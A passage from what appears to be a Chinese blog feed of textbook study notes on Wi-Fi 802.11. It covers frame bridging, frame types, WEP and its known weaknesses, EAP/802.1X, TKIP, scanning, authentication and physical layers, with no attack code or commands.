<h2 id="无线媒介至有线媒介（802-11至Ethernet）"><a href="#无线媒介至有线媒介（802-11至Ethernet）" class="headerlink" title="无线媒介至有线媒介（802.11至Ethernet）"></a>无线媒介至有线媒介（802.11至Ethernet）</h2><p>当接入点的无线接口接收到准备传送至有线网络的帧时，接入点必须在两种媒介之间桥接帧。以下是接入点必须进行的一些列操作</p>
<ol>
<li><p>当接入点接收到一个帧时，首先会检测该帧基本的完整性。</p>
<p> 接下来，接入点会针对所使用的物理层，查看物理层的表头，然后验证802.1帧上的帧校验码（FCS）。</p>
</li>
<li><p>验证帧接收无误后，接入点就会继续查看是否该进行进一步处理该帧。</p>
<ul>
<li>传送至接入点的帧会将接入点的MAC地址（即BSSID）作为802.11MAC表头的Address1字段。不匹配该接入点的BSSID的帧予以丢弃。</li>
<li>802.11 MAC接着检测且移除重复的帧。</li>
</ul>
</li>
<li><p>一旦接入点判断出需要进一步处理该帧，就必须予以解密，因为该帧受到链路层安全算法的保护。</p>
</li>
<li><p>成功解密后，接入点查看该帧是否为帧片段，是否需要进一步重组。</p>
</li>
<li><p>如果经过BSSID 校验，判断接入点必须桥接该帧，较复杂的802.11 MAC 表头就会被转换为较简单的Ethernet MAC标头。</p>
<ul>
<li>Address3字段里的目的地址会被复制到Ethernet的目的地址。</li>
<li>Address2字段里的来源地址会被复制到Ethernet的来源地址</li>
<li>在802.11 Data字段里的SNAP标头将（Type字段里的）类型代码复制到Ethernet帧里的Type字段中。如果Ethernet帧也是用SNAP，那就复制整个SNAP标头</li>
<li>顺序信息主要供帧片段重组之用，不过当帧被桥接之后予以丢弃。</li>
</ul>
</li>
<li><p>重新计算FCS（帧校验码）。</p>
</li>
<li><p>将产生的心帧交付给Ethernet接口传送。</p>
</li>
</ol>
<h2 id="有限媒介至无线媒介（Ethernet至802-11）"><a href="#有限媒介至无线媒介（Ethernet至802-11）" class="headerlink" title="有限媒介至无线媒介（Ethernet至802.11）"></a>有限媒介至无线媒介（Ethernet至802.11）</h2><p>正好相反</p>
<ol>
<li>验证Ethernet FCS后，介入点首先会查看是否需要进一步处理所接收到的帧，即查看该帧的目的地址是否属于当前接入点关联的工作站。</li>
<li>将SNAP标头附加于Ethernet帧的数据之前。</li>
<li>对帧的传送进行调度。</li>
<li>一旦帧被置于队列等待，就会被赋予一个顺序编号。</li>
<li>如果帧需要保护，则对帧（或每个帧片段）的主体加密</li>
<li>802.11 MAC标头根据Ethernet MAC标头产生。</li>
<li>重新计算FCS(帧校验码)。</li>
<li>将产生的新帧交付给802.11接口传送。</li>
</ol>
<p><em>PS:本文仅是学习笔记，将自己认为重要的点记录下来，学习途径是《WiFi802.11无线网络权威指南（第二版）》；</em></p>
]]></content>
      <categories>
        <category>网络通信协议</category>
      </categories>
      <tags>
        <tag>Wi-Fi协议</tag>
      </tags>
  </entry>
  <entry>
    <title>Wi-Fi协议笔记(0X04)</title>
    <url>/Wi-Fi%E5%8D%8F%E8%AE%AE04/</url>
    <content><![CDATA[<h1 id="802-11成帧细节"><a href="#802-11成帧细节" class="headerlink" title="802.11成帧细节"></a>802.11成帧细节</h1><p>802.11帧主要有三种类型</p>
<ul>
<li><p>数据帧</p>
<blockquote>
<p>负责在工作站之间的搬运数据，它可能会因为所处的网络环境不同而有所差异。</p>
<p>数据帧会将上层协议的数据置于帧主题中加以传递。</p>
</blockquote>
</li>
<li><p>控制帧</p>
<blockquote>
<p>通常与数据帧搭配使用，负责区域的清空、信道的取得一级载波监听的维护，并与收到数据时予以肯定确认，借此提高工作站之间数据传送的可靠性。</p>
</blockquote>
</li>
<li><p>管理帧</p>
<blockquote>
<p>负责监督，主要用来加入或退出无线网络一级处理接入点之间关联转移事宜。</p>
</blockquote>
</li>
</ul>
<h2 id="寻址与DS位"><a href="#寻址与DS位" class="headerlink" title="寻址与DS位"></a>寻址与DS位</h2><p>地址字段的编号与功能取决于设定了哪个DS（分布式系统）位，因此所适用的网络类型会间接的影响到地址字段的用法。</p>
<ul>
<li>Address 1字段代表帧接收端的地址。</li>
<li>Address 2字段代表发送端的地址。</li>
<li>Address 3字段是供接入点与分布式系统过滤之用。</li>
</ul>
<blockquote>
<p>由于IBSS（独立基本服务集）并未使用接入点，因此不会设计分布式系统。发送端即为帧的来源，接收端即为帧的目的地。</p>
<p>每个帧都会记载BSSID（基本服务集标识符），因此工作站可以检查广播与组播信息。</p>
<p>只有隶属于同一个BSS的工作站才会处理该广播或组播信息。</p>
<p>在IBSS中，BSSID是有随机数产生器随机产生的。</p>
</blockquote>
<p><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2020/11/06/oab7xq81FuNUmIZ.png" alt="BSSID"></p>
<blockquote>
<p>帧产生字自服务器，所以服务器的MAC地址即为帧的源地址。</p>
</blockquote>
<h2 id="控制帧"><a href="#控制帧" class="headerlink" title="控制帧"></a>控制帧</h2><p>控制帧主要用于协助数据帧的传递。它们可用来管理无线媒介的访问（非媒介本身），以及提供MAC层的可靠性。</p>
<h3 id="一般的帧控制字段"><a href="#一般的帧控制字段" class="headerlink" title="一般的帧控制字段"></a>一般的帧控制字段</h3><p><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2020/11/09/cIKynWfNjSXdLaD.png"></p>
<ul>
<li>Protocol（协议版本）</li>
<li>Type（类型）</li>
<li>SubType（子类型）</li>
<li>ToDS与FromDS位</li>
<li>More Fragments（更多片段）位</li>
<li>ReTry（重试）位</li>
<li>Power Management（电源管理）位</li>
<li>More Date（更多数据）位</li>
<li>Protected Frame（受保护帧）位</li>
<li>Order（次序）位</li>
</ul>
<h2 id="管理帧"><a href="#管理帧" class="headerlink" title="管理帧"></a>管理帧</h2><h3 id="地址字段"><a href="#地址字段" class="headerlink" title="地址字段"></a>地址字段</h3><p>第一个地址字段是给帧的目的地址使用的。</p>
<h3 id="计算持续时间"><a href="#计算持续时间" class="headerlink" title="计算持续时间"></a>计算持续时间</h3><ol>
<li>无竞争周期内所传颂的任何帧均会将持续时间设为32768。</li>
<li>基于竞争的访问周期内利用DCF所传送的帧会通过Duration字段防止别人访问媒介，以确保原子帧交换得以完成。</li>
</ol>
<h3 id="帧主体"><a href="#帧主体" class="headerlink" title="帧主体"></a>帧主体</h3><p>管理帧的主体所包含的固定字段与信息元素是用来<strong>运送信息</strong>的。</p>
<p>管理帧十分灵活。帧主体中的大部分数据雨果使用长度固定的字段，就称为<strong>固定字段</strong>；如果字段长度不确定，就称为<strong>信息元素</strong></p>
<p>所谓信息元素，是指长度不定的数据块。</p>
<h2 id="管理帧的信息元素"><a href="#管理帧的信息元素" class="headerlink" title="管理帧的信息元素"></a>管理帧的信息元素</h2><p>信息元素是管理帧的可变长组件。信息元素通常包含一个<strong>Element ID</strong> （元素标识符）字段，一个<strong>Length</strong>（长度）字段以及一个<strong>长度不定字段</strong>。</p>
<h2 id="管理帧的类型"><a href="#管理帧的类型" class="headerlink" title="管理帧的类型"></a>管理帧的类型</h2><ul>
<li><p>Beacon（信标）帧</p>
<blockquote>
<p>Beacon帧时相当重要的网络维护任务，主要用来声明某个网络的存在。</p>
<p>Beacon帧所及范围即为基本服务区域。</p>
</blockquote>
</li>
<li><p>Probe Request （探查请求）帧</p>
<blockquote>
<p>移动式工作站会利用Probe Request（探查请求）帧来扫描所在区域内目前有哪些802.11网络。</p>
<p>Probe Request帧包含两个字段：SSID以及Supported Rates（移动式工作站所支持的速率）。收到Probe Request帧的工作站会据此判断对方能否加入网络。</p>
</blockquote>
</li>
<li><p>Probe Response帧</p>
<blockquote>
<p>如果Probe Request帧所探查的网络与之兼容，该网络就会以Probe Response帧相应。</p>
<p>送出最后一个Beacon帧的工作站必须负责相应所收到的探查信息。</p>
</blockquote>
</li>
<li><p>IBSS的通知传输指示消息（ATIM）帧</p>
<blockquote>
<p>IBSS中没有接入点，因此无法仰赖接入点来缓存帧。</p>
<p>IBSS中的工作站如果为处于休眠状态的就守着缓存帧，就会在传递期间送出一个ATIM帧来通知对方有信息待传。</p>
</blockquote>
</li>
<li><p>Disassociation帧与Deauthentication帧</p>
<blockquote>
<p>Disassociation（取消关联）帧用来终结一段关联关系。</p>
<p>Deauthentication（接触身份验证）帧则用来终结一段认证关系。</p>
</blockquote>
</li>
<li><p>Association Request（关联请求）帧</p>
<blockquote>
<p>一旦移动式工作站找到兼容网络并且通过身份验证，便会发送Association Request（关联请求）帧以试图加入网络。</p>
</blockquote>
</li>
<li><p>Reassociation Request（重新关联请求）帧</p>
<blockquote>
<p>位于想用扩展服务区域，但在不同基本服务区域之间游走的移动式工作站若要再次使用分布式系统，必须与网络重新关联。</p>
</blockquote>
</li>
</ul>
<h2 id="帧等级"><a href="#帧等级" class="headerlink" title="帧等级"></a>帧等级</h2><p>帧可以被划分为3种等级，在状态1可以传递1级，状态2可以床底1、2级，状态3可以传递1、2、3级</p>
<ul>
<li><p>第一级帧</p>
<blockquote>
<p>第一级帧可以再任何状态中传递，它让802.11的工作站能后进行基本操作。</p>
</blockquote>
</li>
<li><p>第二级帧</p>
<blockquote>
<p>工作站只有在经过身份验证之后才能传递第二级帧，而且第二级帧只能适用于状态2与状态3。第二级帧主要用来管理关联。关联或重新关联成功后，工作站就会进入状态3；如果关联失败，则工作站依然处于状态2。</p>
</blockquote>
</li>
<li><p>第三级帧</p>
<blockquote>
<p>第三级帧的使用时机是在工作站认证成功并与接入点关联之后。一旦工作站进入状态3，就可以使用分布式系统服务，也可以和接入点范围以外的对象进行通信。</p>
</blockquote>
</li>
</ul>
<p><em>PS:本文仅是学习笔记，将自己认为重要的点记录下来，学习途径是《WiFi802.11无线网络权威指南（第二版）》；</em></p>
]]></content>
      <categories>
        <category>网络通信协议</category>
      </categories>
      <tags>
        <tag>Wi-Fi协议</tag>
      </tags>
  </entry>
  <entry>
    <title>Wi-Fi协议笔记(0X05)</title>
    <url>/Wi-Fi%E5%8D%8F%E8%AE%AE05/</url>
    <content><![CDATA[<h1 id="有线等效加密"><a href="#有线等效加密" class="headerlink" title="有线等效加密"></a>有线等效加密</h1><h2 id="WEP的加密操作"><a href="#WEP的加密操作" class="headerlink" title="WEP的加密操作"></a>WEP的加密操作</h2><p>通信安全主要有三个主要目的：</p>
<ol>
<li><strong>机密性</strong>：为了防止数据不受未授权的第三者拦截</li>
<li><strong>完整性</strong>：确保数据没有被修改</li>
<li><strong>真实性</strong>：是所有安全策略的基础，因为数据的可信度</li>
</ol>
<h3 id="WEP的数据处理"><a href="#WEP的数据处理" class="headerlink" title="WEP的数据处理"></a>WEP的数据处理</h3><p>机密性与完整性的操作同时进行。加密之前，帧会通过完整性校验算法，产生一个成为完整性校验值（ICV）的散列值（hash）。ICV可确保帧在传送过程中未被改变。</p>
<p>WEP需要以下三个输入项</p>
<ul>
<li>需要保护的有效荷载（payload）。</li>
<li>秘钥（secret key），用来加密帧。可以用秘钥位字符创或秘钥编号来指定秘钥。</li>
<li>初始向量（IV），和秘钥一起在传送帧时使用。</li>
</ul>
<p>经过处理后，WEP、会产生一个单一输出项：</p>
<ul>
<li>加密过的帧，可以通过不安全的网络加以传送，其中包含足够的信息使对方能够解密。</li>
</ul>
<h3 id="WEP的数据传送"><a href="#WEP的数据传送" class="headerlink" title="WEP的数据传送"></a>WEP的数据传送</h3><ol>
<li>802.11帧由标头和payload组成，WEP只保护payload。</li>
<li>根据802.11MAC的有效荷载（payload）计算出完整性校验值。</li>
<li>帧加密秘钥组装完成，分为秘钥和初始向量（IV）。</li>
<li>帧加密秘钥被当成RC4秘钥。</li>
<li>将payload加密后，工作站开始组装待传的帧。</li>
</ol>
<blockquote>
<p>揭秘过程刚好相反。</p>
<ol>
<li>验证FCS，确保帧未损毁</li>
<li>解读受保护部分。</li>
<li>得到解密数据后，验证ICV。</li>
<li>如果ICV无误，根据SNAP标头所记载内容，将封包数据交给上层协议。</li>
</ol>
</blockquote>
<h3 id="WEP秘钥的长度"><a href="#WEP秘钥的长度" class="headerlink" title="WEP秘钥的长度"></a>WEP秘钥的长度</h3><p>理论上，WEP秘钥可以搭配任意长度的秘钥。但是大多数产品均支持一种或两种长度的秘钥。位移唯一出现在标准中的秘钥长度是64位的WEP种子（seed），其中40位是两个工作站进行传送时共享的密码。</p>
<p>另外一种是比较常用的采用较长的秘钥，通常是使用128-bit的WEP种子，其中104位秘而不宣。有些文档称之为WEP-104。</p>
<h3 id="WEP秘钥的类型"><a href="#WEP秘钥的类型" class="headerlink" title="WEP秘钥的类型"></a>WEP秘钥的类型</h3><ul>
<li><p>映射秘钥</p>
<blockquote>
<p>用来保护流动于特定来源与接收端之间的数据</p>
</blockquote>
</li>
<li><p>默认秘钥</p>
<blockquote>
<p>如果两个802.11工作站之间并不存在映射关系，就必须改用默认秘钥，有时也称广播秘钥。</p>
</blockquote>
</li>
</ul>
<h2 id="WEP系统设计上的瑕疵"><a href="#WEP系统设计上的瑕疵" class="headerlink" title="WEP系统设计上的瑕疵"></a>WEP系统设计上的瑕疵</h2><ol>
<li>手工管理秘钥是问题的症结之一</li>
<li>标准的静态WEP只提供40位的秘钥。128位更安全。</li>
<li>一旦使用重复密钥流，流密码就容易被识破</li>
<li>WEP使用CRC进行完整性检查，CRC并没有密码学上的安全性。</li>
<li>接入点具有解读帧的特权。</li>
</ol>
<p><em>PS:本文仅是学习笔记，将自己认为重要的点记录下来，学习途径是《WiFi802.11无线网络权威指南（第二版）》；</em></p>
]]></content>
      <categories>
        <category>网络通信协议</category>
      </categories>
      <tags>
        <tag>Wi-Fi协议</tag>
      </tags>
  </entry>
  <entry>
    <title>Wi-Fi协议笔记(0X06)</title>
    <url>/Wi-Fi%E5%8D%8F%E8%AE%AE06/</url>
    <content><![CDATA[<h1 id="802-11x用户身份验证"><a href="#802-11x用户身份验证" class="headerlink" title="802.11x用户身份验证"></a>802.11x用户身份验证</h1><h2 id="可扩展身份验证协议（EAP）"><a href="#可扩展身份验证协议（EAP）" class="headerlink" title="可扩展身份验证协议（EAP）"></a>可扩展身份验证协议（EAP）</h2><h3 id="EAP的封包格式"><a href="#EAP的封包格式" class="headerlink" title="EAP的封包格式"></a>EAP的封包格式</h3><p><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2020/11/09/czUaYBvnRew85gE.png"></p>
<ul>
<li><p>code（类型代码）</p>
<blockquote>
<p>其长度为1个字节，代表EAP封包的类型。封包的Data字段必须通过此字段来解析。</p>
</blockquote>
</li>
<li><p>Identifier（标识符）</p>
<blockquote>
<p>长度为1个字节。内容为1个无符号整数，用来匹配请求与响应。</p>
</blockquote>
</li>
<li><p>Length（长度）</p>
<blockquote>
<p>Length本身有两个字节。记载了整个封包的总字节数，包括Code、Identifier、Length以及Data这四个字段。</p>
</blockquote>
</li>
<li><p>Data（数据）</p>
<blockquote>
<p>长度不定，取决于封包类型。也可能不占用任何字节。Data字段如何解析完全取决于Code字段的值。</p>
</blockquote>
</li>
</ul>
<h3 id="EAP身份验证方式"><a href="#EAP身份验证方式" class="headerlink" title="EAP身份验证方式"></a>EAP身份验证方式</h3><p>EAP会把证明用户身份的操作授权给一个成为<code>EAP method</code>（一组验证用户身份的规则）的附属协议。</p>
<p>使用<code>EAP method</code>的优点是，EAP可以不用去管验证用户的细节。如果需求改变，就可以开发新的<code>EAP method</code>来满足这个需求。</p>
<h3 id="EAP交换范例"><a href="#EAP交换范例" class="headerlink" title="EAP交换范例"></a>EAP交换范例</h3><ol>
<li>认证者发出一个<code>请求/身份证明</code>封包以识别用户身份。</li>
<li>客户端要求用户输入标识符，随后将所搜集到的用户表示符以<code>响应/身份证明</code>消息送出。</li>
<li>一旦认出该用户，认证者随即会送出<code>认证质询。</code></li>
<li>客户端在设定上是以<code>token card</code>（令牌卡）进行身份验证，因此它会送出一个<code>Response/NAK</code>（相应/否定确认）消息，提议以<code>一般令牌卡</code>作为认证机制。</li>
<li>认证者送出<code>请求/一般令牌卡</code>的质询，要求取得卡号。</li>
<li>用户输入卡号，通过<code>请求/一般令牌卡</code>送回。</li>
<li>用户的响应不正确，因此认证失败。不过允许多次认证，因此会送出第二个<code>Request/Generic Token Card</code>（请求/一般令牌卡）的质询。</li>
<li>用户再度响应，依然通过<code>Response/Generic Token Card</code>（响应/一般令牌卡）传递。</li>
<li>此次响应正确，认证者发出<code>Success</code>消息</li>
</ol>
<h2 id="802-1X：网络连接端口的认证"><a href="#802-1X：网络连接端口的认证" class="headerlink" title="802.1X：网络连接端口的认证"></a>802.1X：网络连接端口的认证</h2><p>802.1X：“基于端口的网络访问控制。”</p>
<h2 id="802-1X的架构及相关术语"><a href="#802-1X的架构及相关术语" class="headerlink" title="802.1X的架构及相关术语"></a>802.1X的架构及相关术语</h2><p><code>802.1X</code>为认证回话定义了三个组件：</p>
<ul>
<li>申请者：寻求访问网络资源的用户机器。</li>
<li>认证者：控制网络访问，扮演传统拨号网络中访问服务器的角色。（只负责链路层的认证交换过程，并不维护任何用户信息）</li>
<li>认证服务器：任何认证请求均会被传送至认证服务器进行实际的处理。</li>
</ul>
<p><code>802.1X</code>只是一个框架，并非一套完整的规范。实际的认证机制其实是通过认证服务器来完成的。</p>
<h2 id="802-1X与无线局域网"><a href="#802-1X与无线局域网" class="headerlink" title="802.1X与无线局域网"></a>802.1X与无线局域网</h2><p><code>802.1X</code>为任何局域网，包括无线局域网，提供了一个用户认证的框架。</p>
<p><em>PS:本文仅是学习笔记，将自己认为重要的点记录下来，学习途径是《WiFi802.11无线网络权威指南（第二版）》；</em></p>
]]></content>
      <categories>
        <category>网络通信协议</category>
      </categories>
      <tags>
        <tag>Wi-Fi协议</tag>
      </tags>
  </entry>
  <entry>
    <title>Wi-Fi协议笔记(0X07)</title>
    <url>/Wi-Fi%E5%8D%8F%E8%AE%AE07/</url>
    <content><![CDATA[<h1 id="802-11：RSN、TKIP与CCMP"><a href="#802-11：RSN、TKIP与CCMP" class="headerlink" title="802.11：RSN、TKIP与CCMP"></a>802.11：RSN、TKIP与CCMP</h1><h2 id="临时秘钥完整性协议（TKIP）"><a href="#临时秘钥完整性协议（TKIP）" class="headerlink" title="临时秘钥完整性协议（TKIP）"></a>临时秘钥完整性协议（TKIP）</h2><h3 id="TKIP与WEP的差异"><a href="#TKIP与WEP的差异" class="headerlink" title="TKIP与WEP的差异"></a>TKIP与WEP的差异</h3><ul>
<li><p>秘钥层次结构与自动秘钥管理</p>
<blockquote>
<p>不同于WEP直接使用单一主秘钥的做法，TKIP使用了多个主秘钥。</p>
<p>最后用来加密帧的秘钥是从这些秘钥派生而来。</p>
</blockquote>
</li>
<li><p>每帧生成秘钥</p>
<blockquote>
<p>它会为每个帧派生出特有的RC4秘钥。</p>
</blockquote>
</li>
<li><p>序列号计数器</p>
<blockquote>
<p>为每个帧编序列号即可识别出次序错乱的帧，如此便能防范所谓的重放攻击。</p>
</blockquote>
</li>
<li><p>新的消息完整性校验（MIC）</p>
<blockquote>
<p>TKIP以比较牢靠的Michael的完整性校验三列算法，取代WEP所使用的线性散列算法。</p>
</blockquote>
</li>
<li><p>消息完整性校验失败的对策</p>
<blockquote>
<p>MIC可能遭受主动式攻击而被攻陷，因此TKIP包含了一些对策以控制主动式攻击可能造成的损害。</p>
</blockquote>
</li>
</ul>
<h3 id="TKIP的数据传送"><a href="#TKIP的数据传送" class="headerlink" title="TKIP的数据传送"></a>TKIP的数据传送</h3><p>帧长生后，接着发送给TKIP以传送，过程如下：</p>
<ol>
<li>将802.11帧放在队列中等待传送，包含帧头以及payload。</li>
<li>计算消息完整性校验值。</li>
<li>赋予每个帧片段一个序列号。</li>
<li>每个帧均会以其独有的WEP秘钥进行加密。</li>
<li>帧本身加上步骤2所得到的Michael消息完整性校验值以及步骤4所得到的RC4秘钥一并传给WEP，由WEO进行帧封装测试。</li>
</ol>
<h3 id="TKIP的接收"><a href="#TKIP的接收" class="headerlink" title="TKIP的接收"></a>TKIP的接收</h3><ol>
<li>一旦无线接口接收到帧，如果通过帧检查序列确认它不曾损毁，就将其交给TKIP做进一步验证。</li>
<li>TKIP才去的第一个步骤是检查序列号以防范重放攻击。</li>
<li>还原用来加密封包的WEP随机数种子。</li>
<li>WEP随机数种子到手后，就可以出去帧外围包裹的WEP层，然后还原内容。还原过程中，WEP ICV必须接受校验。</li>
<li>如果涉及到帧分段，那么在重组完整有效荷载之前，必须等到所有片段接收完成。</li>
<li>帧重组之后，将会依帧内容计算其Michael值。如果计算出来的值与封包所记载的MIC值相符，则会将帧传递给较上层协议并且将序列号射程帧当中所记载的序列号。</li>
</ol>
<p><em>PS:本文仅是学习笔记，将自己认为重要的点记录下来，学习途径是《WiFi802.11无线网络权威指南（第二版）》；</em></p>
]]></content>
      <categories>
        <category>网络通信协议</category>
      </categories>
      <tags>
        <tag>Wi-Fi协议</tag>
      </tags>
  </entry>
  <entry>
    <title>Wi-Fi协议笔记(0X08)</title>
    <url>/Wi-Fi%E5%8D%8F%E8%AE%AE08/</url>
    <content><![CDATA[<h1 id="管理操作"><a href="#管理操作" class="headerlink" title="管理操作"></a>管理操作</h1><h2 id="管理结构"><a href="#管理结构" class="headerlink" title="管理结构"></a>管理结构</h2><p>在概念上，802.11管理结构由三个组件组成</p>
<blockquote>
<ul>
<li>Mac层管理实体（MLME）</li>
<li>物理层管理实体（PLME）</li>
<li>系统管理实体（SME）</li>
</ul>
</blockquote>
<h2 id="扫描"><a href="#扫描" class="headerlink" title="扫描"></a>扫描</h2><h3 id="被动扫描"><a href="#被动扫描" class="headerlink" title="被动扫描"></a>被动扫描</h3><p>被动扫描可以节省电力，因为不需要传送任何信号。在被动扫描中，工作站会在信道列表所列的各个信道之间不断切换并静候Beacon帧的到来。</p>
<h3 id="主动扫描"><a href="#主动扫描" class="headerlink" title="主动扫描"></a>主动扫描</h3><p>在每个信道上，工作站都会发出Probe Request帧来请求某个特定网络予以响应。扫描过程如下：</p>
<ol>
<li>跳至某个信道，然后等候来帧指示或者等到Probe Delay定时器超时。</li>
<li>利用基本的DCF访问过程取得媒介使用权，然后送出一个Probe Request帧。</li>
<li>至少等候一段最短的信道时间<ul>
<li>如果媒介并不忙碌，表示没有网络存在，因此可以跳至下个信道。</li>
<li>如果在最短的信道时间媒介分厂忙碌，那就继续等候一段时间，直到最长的信道时间超时，然后处理任何的Probe Response帧。</li>
</ul>
</li>
</ol>
<h2 id="82-11身份验证"><a href="#82-11身份验证" class="headerlink" title="82.11身份验证"></a>82.11身份验证</h2><h3 id="开放系统身份验证"><a href="#开放系统身份验证" class="headerlink" title="开放系统身份验证"></a>开放系统身份验证</h3><ol>
<li>第一个帧是子类型为authentication（身份验证）的管理帧。身份验证请求包含两个元素：<ul>
<li>身份验证算法标识字段被设定为0，代表使用开放系统认证方式。</li>
<li>身份验证事务序列号字段被设定为1，代表该帧实际上为事务序列中的第一个帧。</li>
</ul>
</li>
<li>工作站以MAC地址作为身份证明。</li>
<li>第三个帧也是子类型为authentication的管理帧，其中包含三个信息元素：<ul>
<li>身份验证算法标识字段被设定为0，代表使用开放系统身份验证。</li>
<li>序列号为2</li>
<li>还有状态码用来指出身份验证的请求结果。</li>
</ul>
</li>
</ol>
<h2 id="关联操作"><a href="#关联操作" class="headerlink" title="关联操作"></a>关联操作</h2><p>一旦完成身份验证，工作站就可以跟接入点进行关联，以便获得网络的完全访问权。关联属于一种记录保持过程，它让分布式系统能够记录每个移动式工作站的位置，以便将传送给移动式工作站的帧传送给正确的接入点。</p>
<p>关联只限于infrastructure（基础结构型网络），在逻辑上等同于在有线网络中插入网线。</p>
<h3 id="关联过程"><a href="#关联过程" class="headerlink" title="关联过程"></a>关联过程</h3><ol>
<li>一旦移动式工作站与接入点完成身份验证，便可送出关联请求帧。未经过身份验证的工作站会在接入点的响应中收到取消关联帧。</li>
<li>接入点会对关联请求进行处理。<ul>
<li>关联请求获准，接入点会以成功的状态码0以及关联标识符（AID）响应。</li>
<li>关联请求失败，只返回状态码并终止过程。</li>
</ul>
</li>
<li>接入点开始为移动式工作站处理帧。</li>
</ol>
<h1 id="PCF无竞争服务"><a href="#PCF无竞争服务" class="headerlink" title="PCF无竞争服务"></a>PCF无竞争服务</h1><blockquote>
<p>点协调功能（point coordination function，简称<strong>PCF</strong>）</p>
</blockquote>
<h2 id="以PCF提供无竞争访问"><a href="#以PCF提供无竞争访问" class="headerlink" title="以PCF提供无竞争访问"></a>以PCF提供无竞争访问</h2><p>如果需要用到无竞争传输，便可运用PCF。</p>
<blockquote>
<p>CP（竞争周期）再短，至少也要能传送一个最大的帧以及得到相应的确认。若基于竞争的服务超出CFP（无竞争周期）预定的开始时间，CFP就会被压缩。</p>
</blockquote>
<h1 id="物理层概述"><a href="#物理层概述" class="headerlink" title="物理层概述"></a>物理层概述</h1><p>802.11结构的第二个要件为物理层（physical layer），通常简写为PHY。</p>
<h2 id="物理层结构"><a href="#物理层结构" class="headerlink" title="物理层结构"></a>物理层结构</h2><p>物理层被分为两个子层：</p>
<ul>
<li><p>物理层汇聚过程（PLCP）子层</p>
<blockquote>
<p>功能：结合来自MAC的帧与空中所传输的无线电波，PLCP同事会为帧加上自己的标头。</p>
</blockquote>
</li>
<li><p>物理媒体相关（PMD）子层</p>
<blockquote>
<p>功能：负责将PLCP所传来的每个位利用天线传送至空中。</p>
</blockquote>
</li>
</ul>
<p>三种以无线电技术为基础的物理层：</p>
<ul>
<li>802.11a：正交频分复用（OFDM）物理层</li>
<li>802.11b：告诉直接序列（DR/DS或HR/DSSS）物理层</li>
<li>802.11g：增强速率物理层（ERP）</li>
<li>802.11n：多进多出（MIMO）或高吞吐量物理层</li>
</ul>
<h2 id="802-11的RF工程"><a href="#802-11的RF工程" class="headerlink" title="802.11的RF工程"></a>802.11的RF工程</h2><h3 id="RF零件"><a href="#RF零件" class="headerlink" title="RF零件"></a>RF零件</h3><ul>
<li><p>天线</p>
<blockquote>
<p>天线是RF系统中最关键的零件，因为它们负责将线路中的电子信号转换为电波以及将电波反转为电路信号。</p>
<p>天线的长度取决于频率：频率越高，天线越短。</p>
</blockquote>
</li>
<li><p>放大器</p>
<blockquote>
<p>放大器可以增强信号。信号的放大或增益是以分贝（dB）作为测量单位。</p>
<p>放大器大致可分为三种：低噪声、高功率与其他种类。</p>
<p>低噪声放大器（LNA）通常与天线连接，用来将收到的信号放大到与RF系统连接的电子零件可识别的程度。</p>
<p>高功率放大器（HPA）则是用来将信号提升至最大的功率后传送。</p>
</blockquote>
</li>
</ul>
<p><em>PS:本文仅是学习笔记，将自己认为重要的点记录下来，学习途径是《WiFi802.11无线网络权威指南（第二版）》；</em></p>
]]></content>
      <categories>
        <category>网络通信协议</category>
      </categories>
      <tags>
        <tag>Wi-Fi协议</tag>
      </tags>
  </entry>
  <entry>
    <title>Wi-Fi协议笔记(0X09)</title>
    <url>/Wi-Fi%E5%8D%8F%E8%AE%AE09/</url>
    <content><![CDATA[<h1 id="跳频物理层"><a href="#跳频物理层" class="headerlink" title="跳频物理层"></a>跳频物理层</h1><h2 id="跳频传输"><a href="#跳频传输" class="headerlink" title="跳频传输"></a>跳频传输</h2><p>所谓跳频，是以一种预定的伪随机模式快速变换传输频率。</p>
<p>跳频可以避免设备干扰某个频带的主要用户。</p>
<p>如果两个跳频系统需要共享相同的频带，可以指定不同的跳频顺序。</p>
<h2 id="FH-PLCP"><a href="#FH-PLCP" class="headerlink" title="FH PLCP"></a>FH PLCP</h2><p>在帧被调变至RF载波之前，来自MAC的帧必须先经过<strong>物理层汇聚过程</strong>（PLCP）加以处理。</p>
<h3 id="成帧与白化"><a href="#成帧与白化" class="headerlink" title="成帧与白化"></a>成帧与白化</h3><p>FH PHY所使用的PLCP会在MAC传来的帧前面加上表头，其中包含5个字段。</p>
<ul>
<li><p>Preamble（前导码）</p>
<blockquote>
<p>用来同步发射器与接收器，以维系两者之间的定时关系</p>
</blockquote>
</li>
<li><p>Sync（同步）</p>
<blockquote>
<p>Sync的字段长度为80个位，由一系列01交替的序列（01010101…01）组成。</p>
</blockquote>
</li>
<li><p>Start Frame Delimiter（起始帧定界符，间成SFD）</p>
<blockquote>
<p>和Ethernet一样，SFD用来指示前导码的结束以及帧的开始。</p>
</blockquote>
</li>
<li><p>Header（标头）</p>
<blockquote>
<p>前导码后紧跟PLCP标头。此标头包含PLCP所使用的物理层专属参数    ，由长度字段、速度字段以及一个叫校验码组成。</p>
</blockquote>
</li>
<li><p>PSDU Length Word（PSDU长度字，间成PLW）</p>
<blockquote>
<p>PLCP标有的第一个字段是PLW。PLCP帧的有效荷载位长度可达4095个字节的MAC帧。</p>
</blockquote>
</li>
<li><p>PLCP Signaling（PLCP信令，间成PSF）</p>
<blockquote>
<p>位0是第一个被传送出去的位，位1~3是所承载的MAC帧的传输率编码。</p>
</blockquote>
</li>
<li><p>HEC（头部查村校验）</p>
<blockquote>
<p>为了防止PLCP标头错误，因此使用程度为16个位的CRC来校验整个标头的内容，并置于此字段。</p>
</blockquote>
</li>
</ul>
<h1 id="直接序列物理层（802-11b）"><a href="#直接序列物理层（802-11b）" class="headerlink" title="直接序列物理层（802.11b）"></a>直接序列物理层（802.11b）</h1><p>DSSS与HR/DSSS</p>
<h2 id="直接序列传输"><a href="#直接序列传输" class="headerlink" title="直接序列传输"></a>直接序列传输</h2><p>直接序列传输是一种不同而扩频技术，可以通过交款的频带传送信号。</p>
<p>直接序列的技术的基本运作方式：</p>
<blockquote>
<p>通过精确的控制将RF能量分散至某个宽频带。当无线电载波的变动被分散至交款的频带时，接收器通过相关处理找出变动所在。</p>
</blockquote>
